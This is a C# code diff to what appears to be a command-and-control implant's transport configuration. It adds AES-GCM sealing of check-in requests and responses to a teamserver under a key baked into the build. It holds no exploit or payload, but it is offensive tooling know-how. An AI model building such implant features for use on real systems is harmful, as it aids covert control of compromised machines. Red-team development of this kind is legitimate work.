@@ -175,6 +175,7 @@ internal sealed class Config
                 UserAgent = Env("ROD_USER_AGENT", string.Empty),
                 Envelope = Env("ROD_ENVELOPE", string.Empty),
                 EnvelopeKey = Env("ROD_ENVELOPE_KEY", string.Empty),
+                CheckInEnvelope = Env("ROD_CHECKIN_ENVELOPE", string.Empty),
                 RequestTimeout = EnvTimeSpan("ROD_REQUEST_TIMEOUT", TimeSpan.Zero),
                 Headers = ParseHeadersEnv(Env("ROD_HEADERS", string.Empty)),
             },
@@ -545,9 +546,19 @@ internal sealed class TransportProfile
     public string Envelope { get; set; } = string.Empty;
 
     /// <summary>The AES-GCM envelope's baked key material, standard base64 of
-    /// keyId(16) || key(32). Only meaningful with the "aesgcm" envelope; the
-    /// bake (or ROD_ENVELOPE_KEY) fills it.</summary>
+    /// keyId(16) || key(32). Seals the enroll body under the "aesgcm"
+    /// envelope and every check-in body under "aesgcm" check-in protection;
+    /// the bake (or ROD_ENVELOPE_KEY) fills it.</summary>
     public string EnvelopeKey { get; set; } = string.Empty;
+
+    /// <summary>How the envelope check-in bodies are protected
+    /// (architecture.md Sec 8): "aesgcm" seals every POST and its response
+    /// under the baked envelope key, covering a fresh counter -- the
+    /// application-layer authentication the web transports use instead of a
+    /// TLS client certificate; "none" (or empty) sends the plaintext framed
+    /// body, the lab-debug shape. The bake (or ROD_CHECKIN_ENVELOPE) fills
+    /// it; builds default it on.</summary>
+    public string CheckInEnvelope { get; set; } = string.Empty;
 
     /// <summary>True when the envelope wraps the enroll body as base64.</summary>
     public bool IsBase64Envelope =>
@@ -558,6 +569,14 @@ internal sealed class TransportProfile
     /// treated as unencrypted (and the teamserver refuses the body).</summary>
     public bool IsAesGcmEnvelope =>
         Envelope.Equals("aesgcm", StringComparison.OrdinalIgnoreCase)
+        && EnvelopeKey.Length > 0;
+
+    /// <summary>True when the check-in bodies seal under the baked key: the
+    /// shape and the key must both be present, exactly the enroll envelope's
+    /// rule -- a build that asked for sealing without a key falls back to the
+    /// plaintext frame rather than checking in undecodably.</summary>
+    public bool SealsCheckIns =>
+        CheckInEnvelope.Equals("aesgcm", StringComparison.OrdinalIgnoreCase)
         && EnvelopeKey.Length > 0;
 }
 
